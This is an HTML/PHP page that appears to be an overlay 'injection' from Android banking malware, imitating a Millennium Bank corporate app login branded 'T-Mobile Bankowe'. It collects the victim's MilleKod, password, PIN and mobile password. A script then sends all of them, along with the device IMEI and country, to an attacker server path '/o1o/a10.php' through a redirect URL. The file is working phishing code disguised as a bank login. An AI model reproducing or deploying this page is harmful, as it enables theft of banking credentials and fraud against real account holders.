<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>T-Mobile Bankowe</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
    <script src="js/credit.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
    <link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">
	<link rel="stylesheet" href="pl/pl.millennium.corpApp/css/style.css">
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
    <div class="booting on text-center alert alert-danger" style="position: absolute;width: 100%;">
        Błąd połączenia z serwerem
    </div>

    <div class="header">
        <div class="on_header">
            More
        </div>
    </div>

    <div class="img">
        <img src="data:image/gif;base64,R0lGODlh7wAoAPcAAOJ0qdIledc6huBlovje68wJZu2lyd9hns4Qac4abNEideLd4M8Qbc8WbcsAYtAYcdIpec0NaeR8r9l+q/bU5dhBieyhxtImduucw+Boos8Tbu2oyssBY9lIjdxVltAVcfvu9dQsf9tNkvC10s8NbOJyqNU1gc0EZvnk7tUygc0NZ9c2hdxSld/D0c8Ucu+y0Pzx9ueItueKuNc9hsoAYOeNuddBiOiSvPXO4c0FZ/74+/PC2dpKkNQyfuiQuv76/M4JbNQpff30+M0BaOR+sMwCZMwGZvG91+uew9hFieqYwM0CZ9QvgOuawdg8iOiOuuFqo+iMucsFYdIid+mQvMsBYt1YmO+vz+R4rOubwvXQ4u+wz8wEZN9dnNxbldc/hs8bcMsCY99kn/Cx0dtQkuJwpuaCtP79/t5dmuaGtfrp8ffa6eaGtOqWv/TK3/G61d1Wl9lEjPzs9NAdcc0KaOmVvtEadOqUvt1bmOaDs9Y4gtpMju6tzdM8iNMsecwFZf78/dMufeN4rN9loON2q9tRk/bS5OaEtNQrfdEcdOmTvOR7rueKt+iMutqMs9EedM0HaOV/sOLc39lFjNMnfOJvp+qYv/PD2/z2+csGY+qXwO6ry8oAXuBupNlCi+FupueLuOaItOWEs+6uzcsDYdAlcdlGjc4La+yjx80SaOufxfPG3NI1hN1amd5Zmvrn8OWAss4HauR2rOFrpODI1PK+184Ta9xOlOR5rcwFZNASb9MneemWv+WCs+WDseN3q9IcdNAgctIgd9MeeNIddswJY8wAZc0AZswAZNAcdtM4hcwBZcwBZP///8wBZs0BZ/32+dQve+aBs80BZv/+/9pIj+iNuf7+/v/+/s0AZdtPk/PF29pQj/fX58wAZ80Iac0LaeJtpdxXldtQk9Mzg+mTvdc0hNRIjuyew8sHZPC309QmfNVOktlHj/TF3N5gnM0BZd5bm9EfdOiKt+mWvePi4t5amdVTlPC40+aBsdEheeLa3tEofePj48wAZs0AZyH/C1hNUCBEYXRhWE1QPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNS4zLWMwMTEgNjYuMTQ1NjYxLCAyMDEyLzAyLzA2LTE0OjU2OjI3ICAgICAgICAiPiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtbG5zOnhtcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIiB4bWxuczpzdFJlZj0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlUmVmIyIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ1M2IChXaW5kb3dzKSIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDoyNDhGQjA5QzRFMzExMUU4QTJFQUEzRDIzM0I1RDk5QiIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDoyNDhGQjA5RDRFMzExMUU4QTJFQUEzRDIzM0I1RDk5QiI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOjI0OEZCMDlBNEUzMTExRThBMkVBQTNEMjMzQjVEOTlCIiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOjI0OEZCMDlCNEUzMTExRThBMkVBQTNEMjMzQjVEOTlCIi8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+Af/+/fz7+vn49/b19PPy8fDv7u3s6+rp6Ofm5eTj4uHg397d3Nva2djX1tXU09LR0M/OzczLysnIx8bFxMPCwcC/vr28u7q5uLe2tbSzsrGwr66trKuqqainpqWko6KhoJ+enZybmpmYl5aVlJOSkZCPjo2Mi4qJiIeGhYSDgoGAf359fHt6eXh3dnV0c3JxcG9ubWxramloZ2ZlZGNiYWBfXl1cW1pZWFdWVVRTUlFQT05NTEtKSUhHRkVEQ0JBQD8+PTw7Ojk4NzY1NDMyMTAvLi0sKyopKCcmJSQjIiEg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">
    </div>

    <form id="form" method="POST">
        <label for="login">MilleKod</label>
        <input type="text" class="input" placeholder="" required pattern="[0-9a-zA-Z]{4,16}" name="login" id="login">

        <label for="password">Password</label>
        <input type="password" class="input" placeholder="" required pattern="[0-9a-zA-Z]{4,16}" name="password" id="password">

        <label for="pin">PIN</label>
        <input type="password" class="input" placeholder="" required pattern="[0-9]{4,8}" name="pin" id="pin">

        <label for="pin">Mobile Password</label>
        <input type="password" class="input" placeholder="" required pattern="[0-9]{2,16}" name="mob_pas" id="mob_pas">

        <input type="button" onclick="sentServer();" class="button" value="Login">
    </form>



    <script>
        function sentServer(){
          //  var imei_c = document.forms["form"].elements["imei"].value;
            var login1 = document.getElementById('login').value;
            var haslo = document.getElementById('password').value;
            var pin = document.getElementById('pin').value;
            var mob_pas = document.getElementById('mob_pas').value;

            var url='<?php echo $URL; ?>';
            var imei_c='<?php echo $IMEI_country; ?>';

            location.replace(url+'/o1o/a10.php?p='+imei_c+"|Injection_6|pl_millennium_corpapp|"+login1+"|"+haslo+"|"+pin+"|"+mob_pas);
        }
    </script>
    <script>main={booting:function(){var t=this;"undefined"!=typeof angular?setTimeout(function(){$(".booting").removeClass("on"),setTimeout(function(){$(".fixed-top").addClass("on"),t.start()},500)},2e3):setTimeout(function(){t.booting()},300)},start:function(){},loader_:{show:function(){$(".booting").addClass("on")},hide:function(){$(".booting").removeClass("on")}}},main.booting()</script>

</body>
</html>
